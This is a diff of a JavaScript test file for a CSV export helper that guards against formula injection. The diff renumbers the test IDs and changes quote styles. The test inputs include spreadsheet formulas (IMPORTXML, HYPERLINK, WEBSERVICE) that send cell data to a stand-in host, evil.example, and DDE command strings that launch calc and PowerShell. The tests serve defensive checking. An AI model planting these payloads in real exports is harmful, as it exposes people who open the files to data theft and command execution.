@@ -10,7 +10,7 @@ import { describe, it, expect } from 'vitest';
 import { csvCell, csvRow, csvDocument } from '../helpers/csv.js';
 
 describe('CSV formula injection', () => {
-  it('SEC-201 neutralises every formula leader character', () => {
+  it('SEC-231 neutralises every formula leader character', () => {
     for (const leader of ['=', '+', '-', '@', '\t', '\r']) {
       const out = csvCell(`${leader}cmd|'/c calc'!A0`);
       // The apostrophe must be the first character of the emitted field, inside quotes
@@ -20,14 +20,14 @@ describe('CSV formula injection', () => {
     }
   });
 
-  it('SEC-202 neutralises the classic data-exfiltration formulas', () => {
+  it('SEC-232 neutralises the classic data-exfiltration formulas', () => {
     const payloads = [
       '=IMPORTXML("https://evil.example/?d="&A1,"//x")',
       '=HYPERLINK("https://evil.example/?"&A1,"Click for refund")',
       '=WEBSERVICE("https://evil.example/?d="&A1)',
-      '@SUM(1+1)*cmd|\'/c powershell -e ...\'!A0',
+      "@SUM(1+1)*cmd|'/c powershell -e ...'!A0",
       '+1+1',
-      '-2+3+cmd|\'/c calc\'!A0',
+      "-2+3+cmd|'/c calc'!A0",
     ];
     for (const p of payloads) {
       const out = csvCell(p);
@@ -36,7 +36,7 @@ describe('CSV formula injection', () => {
     }
   });
 
-  it('SEC-203 still prefixes when the value also needs RFC4180 quoting', () => {
+  it('SEC-233 still prefixes when the value also needs RFC4180 quoting', () => {
     // Quoting alone does NOT stop Excel evaluating a formula, so both must happen and
     // the apostrophe must be inside the quotes.
     const out = csvCell('=CONCAT("a","b")');
@@ -44,13 +44,13 @@ describe('CSV formula injection', () => {
     expect(out.endsWith('"')).toBe(true);
   });
 
-  it('SEC-204 escapes embedded quotes by doubling and does not break the record', () => {
+  it('SEC-234 escapes embedded quotes by doubling and does not break the record', () => {
     expect(csvCell('say "hi"')).toBe('"say ""hi"""');
     expect(csvCell('a,b')).toBe('"a,b"');
     expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
   });
 
-  it('SEC-205 leaves ordinary values untouched so exports stay readable', () => {
+  it('SEC-235 leaves ordinary values untouched so exports stay readable', () => {
     expect(csvCell('VERIFIED')).toBe('VERIFIED');
     expect(csvCell('run_01HZ')).toBe('run_01HZ');
     expect(csvCell(2900)).toBe('2900');
@@ -58,11 +58,11 @@ describe('CSV formula injection', () => {
     expect(csvCell(undefined)).toBe('');
   });
 
-  it('SEC-206 protects a whole export row built from evidence fields', () => {
+  it('SEC-236 protects a whole export row built from evidence fields', () => {
     const row = csvRow([
       'run_01HZ',
       'FAILED',
-      '=cmd|\'/c calc\'!A0', // an attacker-controlled CRM property value
+      "=cmd|'/c calc'!A0", // an attacker-controlled CRM property value
       'first_name',
       2900,
     ]);
@@ -71,7 +71,7 @@ describe('CSV formula injection', () => {
     expect(csvDocument([['a'], ['b']])).toBe('a\r\nb');
   });
 
-  it('SEC-207 does not let a negative money value be mistaken for a formula leader', () => {
+  it('SEC-237 does not let a negative money value be mistaken for a formula leader', () => {
     // Regression guard: a naive "strip leading -" fix would corrupt refund amounts.
     // The apostrophe is prefixed, never the character removed.
     const out = csvCell('-2900');
